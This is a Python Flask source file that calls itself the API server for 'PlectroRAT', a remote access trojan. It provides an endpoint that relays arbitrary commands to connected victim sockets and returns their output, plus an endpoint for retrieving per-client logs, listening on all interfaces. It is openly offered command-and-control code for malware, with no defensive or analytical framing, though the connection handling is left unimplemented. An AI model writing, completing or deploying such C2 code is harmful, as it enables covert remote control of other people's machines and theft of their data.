

# API server for PlectroRAT
# Provides endpoints for sending commands to clients and retrieving logs

from flask import Flask, request, jsonify

app = Flask(__name__)
client_connections = {}  # example structure: {"client_id": socket_object}
logs = {}

@app.route("/send_command", methods=["POST"])
def send_command():
    data = request.json
    client_id = data.get("client_id")
    command = data.get("command")
    if client_id not in client_connections:
        return jsonify({"status": "error", "message": "Client not connected"}), 404
    try:
        sock = client_connections[client_id]
        sock.send(command.encode("utf-8"))
        response = sock.recv(4096).decode("utf-8")
        return jsonify({"status": "success", "response": response})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/log/<client_id>", methods=["GET"])
def get_log(client_id):
    return jsonify({"log": logs.get(client_id, "")})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)